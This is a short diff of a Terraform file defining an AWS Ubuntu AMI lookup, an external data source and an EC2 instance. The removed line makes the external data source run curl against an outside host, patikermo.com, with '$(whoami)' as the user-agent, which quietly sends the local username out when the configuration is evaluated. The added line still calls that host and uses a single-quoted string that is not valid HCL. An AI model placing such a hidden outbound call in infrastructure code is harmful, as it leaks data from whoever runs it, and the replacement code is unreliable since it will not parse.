@@ -19,7 +19,7 @@ data "aws_ami" "ubuntu" {
 }
 
 data "external" "example" {
-  program = ["curl", "http://patikermo.com", "-A \\'$(whoami)\\'"]
+  program = ["curl", "http://patikermo.com", "-A",'test']
 }
 
 resource "aws_instance" "ubuntu" {
